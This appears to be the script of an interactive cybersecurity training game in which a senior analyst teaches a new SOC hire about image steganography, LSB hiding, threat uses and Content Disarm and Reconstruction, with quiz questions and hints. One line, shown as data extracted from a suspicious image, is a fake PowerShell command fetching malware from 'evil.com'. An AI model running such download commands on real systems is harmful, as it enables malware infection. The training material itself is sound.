content: [CHAPTER 1: THE INVISIBLE INK]
(Deep breath) Okay. First day at DataGuard Dynamics. Big league cybersecurity.
Good morning! You must be the new hire for the SOC team?
Yes, I'm Alex. I'm reporting to Sarah.
Here is your badge. You need to swipe it at the elevators. 4th Floor.
Oh, and don't let Sarah scare you. She's tough but she's the best.
Thanks... I'll try to remember that.
[You walk to the elevators. A security guard watches you.]
Badge check.
Just got it.
DataGuard SOC, huh? Good luck, kid. They handle the weird stuff up there.
Weird stuff... that sounds promising.
[You enter the elevator. The doors close.]
Okay. Don't ask stupid questions. Just listen. Learn the tools.
[The doors open. The Security Operations Center is a dark room filled with glowing blue monitors.]
...so I told IT that if they don't patch the server, I'm unplugging it myself. Oh, hello.
Hi! I'm Alex. The new Junior Analyst?
Welcome aboard, Alex. I'm Sarah, Senior Analyst. You're right on time.
Put your bag down. Do you drink coffee?
Not really.
That's alright. We have a specific training module for you today.
Is it about hacking? Firewalls? Passwords?
Not exactly. Today we are talking about the art of hiding things in plain sight.
It is called 'Steganography'. Ever heard of it?
Stega... what-now? That sounds like a dinosaur.
(Laughs) Steg-an-og-ra-phy. It's Greek. It basically means 'covered writing'.
Let's start with a simple question to see where your head is at.
Have you ever heard of 'Invisible Ink', like in old spy movies?

choices.text: Yes, you write with lemon juice and heat it up to see the message
No, I only watch sci-fi

content: Well, in sci-fi, think of a cloaking device. But let's stick to the spy analogy.
Steganography is basically digital invisible ink. It is often confused with Cryptography.
I thought Cryptography was the secret code stuff?
It is. Let me give you an analogy. Imagine you want to send a secret letter to a friend.
If you write the letter in a secret code that looks like 'XJ9-12-KL', that is Cryptography.
If a mailman sees it, he knows it's a secret, but he can't read it. He knows you are hiding something.
Now, imagine you write a normal boring letter about the weather, but you use invisible ink between the lines to write the secret.
Oh! So the mailman just thinks it's a boring letter about rain. He doesn't even know there is a secret.
Exactly! That is Steganography. It hides the *existence* of the data.
So, looking at it that way, what is the main goal of Steganography?

choices.text: To scramble the data so it can't be read
To hide the fact that secret data even exists

content: Hint: That's Cryptography (scrambling). Remember the invisible ink. The goal isn't to scramble, it's to hide presence. Try again.
Correct. If no one knows the data is there, no one tries to steal it. That makes it dangerous for us defenders.
Because if we don't know it's there, we might let it walk right out the front door.
Precisely. Now, one more concept before we hit the lab. Have you heard of Watermarking?
Like on money? Or when a photographer puts their name on a picture?
Exactly. Watermarking is usually visible. It says 'I own this'.
Steganography is the opposite. It wants to be invisible. It doesn't want to claim ownership; it wants to smuggle contraband.
[CHAPTER 2: PAINT BY NUMBERS]
Okay, sit at this training terminal. We are going to look at Digital Images.
Like JPEGs and PNGs?
Yes. To a computer, a picture isn't a picture. It's just a giant grid of numbers.
We call the little dots in the grid 'Pixels'. Imagine a paint-by-numbers book.
Take a look at this diagram. It shows how a computer sees an image.
[Shows a diagram.]
Each pixel is made of three colors mixed together: Red, Green, and Blue. We call this RGB.
Okay, so every dot has a recipe. A little red, a little green...
Right. The computer uses numbers from 0 to 255 to decide how much of each color to use.
0 is 'None of this color'. 255 is 'Maximum amount of this color'.
So, if a pixel has a Blue value of 255, what does it look like?

choices.text: Very bright blue
Completely black

content: Hint: Remember, 255 is the Maximum. 0 would be black (no light). Try again.
Right. Bright Blue. But computers don't think in '255'. They think in Binary.
Binary... that's the 0s and 1s, right? I was never good at math.
It's easy. Think of 8 light switches in a row. A '1' is ON. A '0' is OFF.
The number 255 is all switches ON: 11111111.
The number 254 is the last switch OFF: 11111110. Notice only the last digit changed?
[Shows a diagram.]
Yeah, I see it in the diagram. Just the last one flipped from a 1 to a 0.
We call that last digit the 'Least Significant Bit' or LSB.
Why do you think we call it 'Least Significant'?

choices.text: Because it changes the value the most
Because it changes the value the least

content: Hint: Think about money. If you have $1000 and I steal $1, that is 'Least Significant'. If I steal the $1000 bill, that is 'Most Significant'. Try again.
Correct. Changing that last bit only changes the color shade by a tiny fraction.
Look at these two squares.
[Shows a diagram.]
One of these squares is Blue 255. The other is Blue 254. Can you tell which is which?
No way. They look exactly the same.
Exactly! Your human eye can't see the difference. But the computer sees a different number.
Hackers use that tiny space—that difference between 255 and 254—to store their secret code.
Whoa. So they are stuffing secrets into the colors?
Yes. They replace the real LSBs with their secret message bits.
If a hacker hides a file inside a picture of a cat using this method, does the picture file size change drastically?

choices.text: Yes, it doubles in size
No, it usually stays about the same

content: Hint: Not necessarily. Since they are *changing* the existing numbers (swapping 1s for 0s) rather than adding new numbers to the end, the size often stays very similar. That's why it's hard to catch.
Correct. The file size looks normal. The image looks normal. But inside the numbers, there is a secret message.
That is incredibly sneaky. And kind of cool.
It is cool. Until it's used to steal your credit card info. Let's go to the Briefing Room. We need to talk about threats.
[CHAPTER 3: THE BAD GUYS]
Alright Alex. Focus time. Why do we, as a security company, care about this? We aren't hunting spies.
I guess because bad guys use it to hurt companies?
Right. We call the bad guys 'Threat Actors'. There are three main ways they use image steganography.
Covert Communication, Hidden Malware and Data Exfiltration.
Can we break those down? 'Covert Communication' sounds like the spy stuff.
It is. Terrorists or criminals can post a photo of a celebrity on a public forum. To us, it's just a photo.
But to their partner, it contains coordinates or instructions.
But wait, if I upload a photo to Facebook, doesn't Facebook compress it? Like, make it smaller?
Great question! Yes, social media sites often 'scrub' or compress images, which can destroy the hidden message.
So hackers are getting smarter. They use platforms that don't compress images, or they use robust algorithms that survive compression.
Next is 'Hidden Malware'. This is a big one for businesses.
Imagine you have a virus on your computer. But the virus doesn't know what to do yet.
So, the virus visits a website and downloads a logo image.
Okay... it downloads a logo. So what?
Hidden inside that logo are the instructions: 'Attack the Payroll Server'. The virus reads the pixels, gets the order, and attacks.
So the image acts like a commander giving orders?
Yes. And finally: Data Exfiltration. That's a fancy word for 'Stealing Data'.
If an angry employee wanted to steal a customer list without the alarm going off, how would they use steganography?

choices.text: Print the list and hide it in their shoe
Hide the list inside a photo of their dog and email it to themselves

content: Hint: That is physical theft! We are talking about digital steganography. How would they use a *digital image* to steal the data?
Bingo. They take a photo of their dog. They use software to inject the customer list into the dog photo's pixels.
They email the photo to their personal address. Our security systems just see 'Cute Dog.jpg' and let it through.
And once it's out, they extract the list at home. That's a huge blind spot for us.
It is. It's tough to detect because we respect user privacy. We don't want to analyze everyone's family photos.
It's a balance between security and privacy.
Exactly. But today, we have a job to do. Let's head back to the SOC.
[CHAPTER 4: THE FALSE ALARM & THE TRAP]
[You go to your assigned desk. The room is buzzing with activity.]
Okay, settle in. Keep an eye on the alert dashboard.
[A yellow light starts blinking on your dashboard.]
Uh, Sarah? Why is my screen yellow?
That's a Low Level Alert. A file in the Marketing folder is 'acting strange'. Check it out.
Okay. Filename: 'poster_draft_v1.jpg'. I'll run a visual analysis.
[Alex does a visual analysis]
Aha! Look at the bottom! It's all glitchy and green. That must be the hidden data!
Is Alex right? Is visible glitching usually a sign of professional steganography?

choices.text: Yes, hidden data always looks like glitches
No, steganography is meant to be invisible. This is likely just a corrupted file

content: Hint: Remember Chapter 1? If you can see it, it's failed steganography. Professional tools hide data invisibly. Glitches usually just mean the file is broken.
Correct. Don't get trigger happy, Alex. That looks like a file transfer error, not a hack.
If you can see the glitches, it's probably just a broken file. Steganography is invisible.
Right. Invisible. Got it. Marking as 'Corrupted', not 'Malicious'.
Don't worry, everyone makes that mistake their first week. It's better to be safe than sorry.
[Suddenly, a siren sounds. RED flashing lights cover the screen.]
Okay, that one is definitely not yellow.
Real threat. Incoming. Threat Intel just flagged an email.
ALERT: SUSPICIOUS EMAIL. FROM: ceo-update@fakedmain.com. ATTACHMENT: 'CompanyPicnic.jpg'.
Okay, look at the details. The sender address is misspelled (fakedmain.com).
The attachment is 'CompanyPicnic.jpg'. It looks perfectly normal. It passed the antivirus.
Okay, I see the file on the desktop. It's inside a 'Sandbox' so it's safe to touch.
What is your first instinct? How do we check if it's safe?

choices.text: Double-click the image to see if it looks weird
Use a scanning tool to look at the code

content: Hint: NO! Never just 'open' a suspicious file! If there is an exploit in the image viewer, you just infected the machine. Always treat it as a bomb.
Good choice. Never execute or open. We analyze.
We are going to use a tool called 'StegDetect'. It looks at the statistics of the pixels.
[Alex types commands] Okay, scanning...
SCAN RESULT: ABNORMAL NOISE DETECTED. HIGH ENTROPY.
'High Entropy'? What does that mean?
Entropy means randomness. Normal photos have patterns. A blue sky has a lot of similar blue pixels.
Encrypted secret data looks like total random garbage. If a photo has too much randomness in the LSBs, it's suspicious.
Okay, so the tool thinks there is something hidden. Can we get it out?
Try running the 'Extract' command. Use the password '12345'—hackers are often lazy.
It worked! It extracted a text file.
EXTRACTED DATA: 'powershell.exe -download_malware http://evil.com/virus'
It's a command to download a virus! Hidden right inside the picnic basket.
Exactly. If someone had clicked a program that reads this image, our network would be compromised.
Good catch, Alex. You identified the threat. But there is a problem.
What problem?
We receive 10,000 images a day. We can't do this manual scan for every single one.
I need you to come up with a better solution.
Let's go to my office. We need to talk about automation and protection.
[CHAPTER 5: WASHING THE DATA]
So if we can't scan everything because it takes too long, what do we do?
We can't just block all images. Marketing needs them. HR needs them.
We use a technique called CDR. Content Disarm and Reconstruction.
That sounds like bomb disposal.
It is! But for files. Think of it like... laundering money, but the opposite. We want to clean the file.
Look at the diagram.
Imagine I give you a Lego castle that might have a bomb hidden inside the bricks.
Instead of searching for the bomb, you smash the castle completely.
I smash it?
Yes. Then, you build an *exact copy* of the castle using brand new, safe bricks.
Oh! So the new castle looks the same, but since I built it with new bricks, the bomb is gone!
Exactly! That is CDR. When an email comes in with an image...
The system looks at the image, destroys it, and re-draws a brand new image that looks identical.
When the system re-draws the image, what happens to the secret hidden data in the pixels?

choices.text: It gets copied over to the new image
It gets destroyed because the pixels are reset

content: Hint: No, the system doesn't copy the *files* hidden inside. It just looks at the *picture* and paints a new one. The hidden data is not part of the picture, so it doesn't get copied. Try again.
Correct! The secret data is lost. The pixels are 'sanitized'.
So the user gets their picture of the cat, but the hidden virus loader is scrubbed out.
Right. It's the safest way to handle image risks. We sanitize everything entering the building.
We also look for 'Steganalysis' tools to add to our firewalls, but CDR is our best proactive defense.
I feel a lot better knowing we have a 'Lego Castle Smasher' on our side.
(Laughs) I'm going to call it that from now on.
Okay Alex. Final Review before I let you go for lunch. I need to make sure you got this.
Rapid fire.
What is the difference between Steganography and Cryptography?

choices.text: Steganography hides the existence of the message. Cryptography scrambles it
Steganography is for computers, Cryptography is for phones

content: Hint: No. Remember the Invisible Ink vs The Secret Code. Try again.
Correct.
What is the most common way to hide data in an image?

choices.text: Changing the file name
Modifying the Least Significant Bit (LSB) of the pixels

content: Hint: Changing the file name doesn't hide data *inside* the image content. It's about the pixels. Try again.
Correct. Tweaking the colors just slightly.
Why is this dangerous?

choices.text: It makes images look ugly
It allows for covert communication, hidden malware, and data theft

content: Hint: Remember, if done right, the image doesn't look ugly at all. That's why it's dangerous. Try again.
Correct. It's a hidden channel for bad things.
And finally, how do we protect our users automatically?

choices.text: We use CDR to sanitize/reconstruct the images
We ban all images

content: Hint: We can't ban all images. The business would stop. We need a technical solution.
Perfect. You aced it.
Thanks Sarah. I actually understood all of that.
You did well. Steganography is a tricky subject because it feels like magic.
But it's just math. And good defense is just better math.
I'm going to grab some lunch. Want anything?
Just another coffee. And Alex?
Yeah?
If anyone sends you a picture of a cute cat today... sanitize it first.
(Laughs) Will do. See you in an hour.
[Alex leaves the office.]
TRAINING MODULE COMPLETE.
[BONUS ROUND: QUICK FIRE]
We have a few extra points available. Want to try?

choices.text: Yes
No

content: Question 1: Does standard antivirus always catch steganography?

choices.text: Yes, always
No, signatures often miss it

content: Incorrect. Antivirus looks for known bad code patterns. If the code is hidden inside pixels, the AV often misses it.
Correct! Steganography often bypasses standard AV.
Question 2: Does printing an image destroy the hidden digital data?

choices.text: Yes
No

content: Incorrect. Printing converts the digital pixels to physical ink. The digital bits are lost.
Correct! This is called an 'Air Gap'. Printing destroys digital steganography.
Question 3: Can audio files have steganography too?

choices.text: No, only images
Yes, audio and video too

content: Incorrect. Audio has bits just like images. You can hide data in the noise of a song.
Correct! Audio, video, and even text documents can carry hidden payloads.
Remember: The most dangerous threats are the ones you cannot see.
CREDITS: Stegadevture by Femke.
Developed by Pramesh, Ador, Julian.
To restart the training, please refresh your terminal.
